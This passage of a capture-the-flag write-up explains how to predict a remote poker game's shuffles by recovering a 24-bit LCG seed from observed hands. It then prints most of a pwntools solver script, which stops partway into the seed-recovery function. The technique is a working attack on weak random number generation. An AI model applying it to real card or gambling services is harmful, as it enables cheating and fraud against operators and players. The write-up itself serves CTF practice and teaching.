<p>The remote poker game shuffles the deck using a non-cryptographic linear congruential generator (LCG) with a 24‚Äëbit seed and Fisher‚ÄìYates. By folding a few rounds to collect consecutive player hands, we can recover the seed (via a small time-window search or full 2^24 brute-force), reproduce future shuffles, and bet only when our predicted hand strictly beats the dealer. Beating the dealer 30 time gets the flag.</p>
<ul>
<li>PRNG: LCG with parameters A=1103515245, C=12345, M=2^31, seed truncated to 24 bits.</li>
<li>Shuffle: Fisher Yates, advancing the PRNG once per swap (51 draws per round).</li>
<li>Observation: Player receives the first 5 cards of the shuffled deck; dealer receives the next 5.</li>
<li>Attack: Collect 4 consecutive hands while folding; recover seed; predict all future rounds; bet only on guaranteed wins; reach streak 30.</li>
</ul>
<h4 id="solution-10">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-10">#</a></h4>
<ol>
<li>Data collection &ndash;&gt; folding:</li>
</ol>
<ul>
<li>Read the ASCII cards for 4 consecutive rounds (<code>HAND_SAMPLES = 4</code>).</li>
<li>Always send <code>f</code> (fold) during this phase. This preserves the streak and ensures one shuffle per round without extra PRNG usage.</li>
</ul>
<ol start="2">
<li>Recover the seed:</li>
</ol>
<ul>
<li>Time-windowed search: the seed is derived created using <code>time.time()</code> modulo 2^24, I assumed the timestamp reflects the time at which I connected to the service. Start from <code>now &amp; 0xFFFFFF</code> and try radii 10m, 1h, 6h, 24h (~600, ~3600, ~21600, ~86400 seconds). For each candidate seed, simulate <code>HAND_SAMPLES</code> shuffles and check that the top 5 cards match the observed player hands.</li>
<li>Full brute-force fallback: if the time-window search fails, scan the entire 24-bit space (~16.7M seeds). This is still feasible with efficient Python and early rejection.</li>
</ul>
<ol start="3">
<li>Predict and win:</li>
</ol>
<ul>
<li>After recovering the seed, fast-forward the PRNG by performing <code>HAND_SAMPLES</code> shuffles to sync with the upcoming round.</li>
<li>For each future round:
<ul>
<li>Simulate the next shuffle and extract the player‚Äôs and dealer‚Äôs 5-card hands (positions 0..4 and 5..9 of the shuffled deck).</li>
<li>Evaluate both hands using the same ranking as the server and compare.</li>
<li>Bet only if the player‚Äôs hand strictly beats the dealer‚Äôs; otherwise fold.</li>
</ul>
</li>
<li>Repeat until streak reaches 30; the server prints the flag.</li>
</ul>
<h4 id="script-9">Script<a hidden class="anchor" aria-hidden="true" href="#script-9">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span><span class="p">,</span> <span class="n">context</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="n">MAX_SEED</span> <span class="o">=</span> <span class="mh">0xFFFFFF</span>  <span class="c1"># 24-bit</span>
</span></span><span class="line"><span class="cl"><span class="n">HAND_SAMPLES</span> <span class="o">=</span> <span class="mi">4</span>      <span class="c1"># number of initial hands to collect for seed filtering</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RANK_ORDER</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;2&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">,</span><span class="s1">&#39;5&#39;</span><span class="p">,</span><span class="s1">&#39;6&#39;</span><span class="p">,</span><span class="s1">&#39;7&#39;</span><span class="p">,</span><span class="s1">&#39;8&#39;</span><span class="p">,</span><span class="s1">&#39;9&#39;</span><span class="p">,</span><span class="s1">&#39;T&#39;</span><span class="p">,</span><span class="s1">&#39;J&#39;</span><span class="p">,</span><span class="s1">&#39;Q&#39;</span><span class="p">,</span><span class="s1">&#39;K&#39;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">SUITS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;‚ô†&#39;</span><span class="p">,</span><span class="s1">&#39;‚ô•&#39;</span><span class="p">,</span><span class="s1">&#39;‚ô¶&#39;</span><span class="p">,</span><span class="s1">&#39;‚ô£&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">RANK_VALUE</span> <span class="o">=</span> <span class="p">{</span><span class="n">r</span><span class="p">:</span> <span class="n">i</span><span class="o">+</span><span class="mi">2</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">RANK_ORDER</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Build canonical ordered deck</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_deck</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[(</span><span class="n">r</span><span class="p">,</span><span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">RANK_ORDER</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">SUITS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># LCG parameters (mod 2^31)</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="mi">1103515245</span>
</span></span><span class="line"><span class="cl"><span class="n">C</span> <span class="o">=</span> <span class="mi">12345</span>
</span></span><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">lcg_next</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">A</span> <span class="o">*</span> <span class="n">state</span> <span class="o">+</span> <span class="n">C</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7fffffff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Apply Fisher-Yates using LCG state; returns new state after 51 draws and deck</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shuffle_with_state</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">deck</span> <span class="o">=</span> <span class="n">build_deck</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">deck</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">lcg_next</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="n">state</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">deck</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">deck</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">deck</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">deck</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span><span class="p">,</span> <span class="n">deck</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Hand evaluation (same tuples ordering as server)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hand_strength</span><span class="p">(</span><span class="n">cards</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ranks</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">([</span><span class="n">RANK_VALUE</span><span class="p">[</span><span class="n">r</span><span class="p">]</span> <span class="k">for</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cards</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">suits</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span> <span class="k">for</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">s</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cards</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">counts</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">rv</span> <span class="ow">in</span> <span class="n">ranks</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">counts</span><span class="p">[</span><span class="n">rv</span><span class="p">]</span> <span class="o">=</span> <span class="n">counts</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">rv</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">by_count_then_rank</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">counts</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">kv</span><span class="p">:</span> <span class="p">(</span><span class="n">kv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">kv</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_flush</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">suits</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">sorted_unique_desc</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">ranks</span><span class="p">),</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_straight</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">straight_high</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sorted_unique_desc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">top</span> <span class="o">=</span> <span class="n">sorted_unique_desc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">sorted_unique_desc</span> <span class="o">==</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">top</span><span class="p">,</span> <span class="n">top</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">is_straight</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="n">straight_high</span> <span class="o">=</span> <span class="n">top</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">wheel</span> <span class="o">=</span> <span class="p">[</span><span class="mi">14</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">sorted_unique_desc</span> <span class="o">==</span> <span class="n">wheel</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">is_straight</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="n">straight_high</span> <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">    <span class="n">counts_sorted</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="p">(</span><span class="n">_</span><span class="p">,</span><span class="n">c</span><span class="p">)</span> <span class="ow">in</span> <span class="n">by_count_then_rank</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ranks_sorted_by_count</span> <span class="o">=</span> <span class="p">[</span><span class="n">r</span> <span class="k">for</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">_</span><span class="p">)</span> <span class="ow">in</span> <span class="n">by_count_then_rank</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_flush</span> <span class="ow">and</span> <span class="n">is_straight</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">straight_high</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_flush</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">ranks</span><span class="p">,</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_straight</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">straight_high</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">trips_rank</span> <span class="o">=</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">kickers</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">([</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">ranks</span> <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="n">trips_rank</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">trips_rank</span><span class="p">,</span> <span class="n">kickers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">high_pair</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">low_pair</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">kicker</span> <span class="o">=</span> <span class="p">[</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">ranks</span> <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="n">high_pair</span> <span class="ow">and</span> <span class="n">r</span> <span class="o">!=</span> <span class="n">low_pair</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">high_pair</span><span class="p">,</span> <span class="n">low_pair</span><span class="p">,</span> <span class="n">kicker</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">counts_sorted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pair_rank</span> <span class="o">=</span> <span class="n">ranks_sorted_by_count</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">kickers</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">([</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">ranks</span> <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="n">pair_rank</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pair_rank</span><span class="p">,</span> <span class="n">kickers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">ranks</span><span class="p">,</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compare_hands</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span> <span class="o">=</span> <span class="n">hand_strength</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s2</span> <span class="o">=</span> <span class="n">hand_strength</span><span class="p">(</span><span class="n">p2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">s1</span> <span class="o">&gt;</span> <span class="n">s2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">s1</span> <span class="o">&lt;</span> <span class="n">s2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">CARD_WIDTH</span> <span class="o">=</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl"><span class="n">CARD_LINES</span> <span class="o">=</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_hand</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="n">block</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Expect 7 lines of cards</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">CARD_LINES</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s1">&#39;Unexpected hand block lines&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">line1</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># second line (index 1)</span>
</span></span><span class="line"><span class="cl">    <span class="n">line3</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>  <span class="c1"># fourth line (index 3)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts1</span> <span class="o">=</span> <span class="n">line1</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>  <span class="c1"># cards separated by space</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts3</span> <span class="o">=</span> <span class="n">line3</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">cards</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">card_regex_rank</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;‚îÇ(.{1,2})\s</span><span class="si">{3}</span><span class="s1">‚îÇ&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">card_regex_suit</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;‚îÇ\s</span><span class="si">{2}</span><span class="s1">(.)\s</span><span class="si">{2}</span><span class="s1">‚îÇ&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ranks</span> <span class="o">=</span> <span class="n">card_regex_rank</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">line1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">suits</span> <span class="o">=</span> <span class="n">card_regex_suit</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">line3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ranks</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="n">suits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s1">&#39;Rank/suit count mismatch&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">r</span><span class="p">,</span><span class="n">s</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">ranks</span><span class="p">,</span><span class="n">suits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cards</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">r</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">s</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cards</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HAND_HEADER</span> <span class="o">=</span> <span class="s1">&#39;Your hand:&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_until_hand</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Action? [b]et / [f]old &gt; &#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Extract portion between &#39;Your hand:&#39; and the prompt</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">HAND_HEADER</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Get last occurrence</span>
</span></span><span class="line"><span class="cl">            <span class="n">idx</span> <span class="o">=</span> <span class="n">text</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="n">HAND_HEADER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">after</span> <span class="o">=</span> <span class="n">text</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">HAND_HEADER</span><span class="p">):]</span>
</span></span><span class="line"><span class="cl">            <span class="n">top_idx</span> <span class="o">=</span> <span class="n">after</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;‚îå&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">top_idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="n">hand_block</span> <span class="o">=</span> <span class="n">after</span><span class="p">[</span><span class="n">top_idx</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s1">&#39;Action? [b]et / [f]old &gt;&#39;</span> <span class="ow">in</span> <span class="n">hand_block</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">hand_block</span> <span class="o">=</span> <span class="n">hand_block</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;Action? [b]et / [f]old &gt;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Keep exactly 7 lines</span>
</span></span><span class="line"><span class="cl">            <span class="n">lines</span> <span class="o">=</span> <span class="n">hand_block</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="n">CARD_LINES</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">hand_ascii</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">parse_hand</span><span class="p">(</span><span class="n">hand_ascii</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Parse error, retry:&#39;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;info&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># else keep waiting</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_seed</span><span class="p">(</span><span class="n">hands</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">candidates</span> <span class="o">=</span> <span class="p">[]</span>
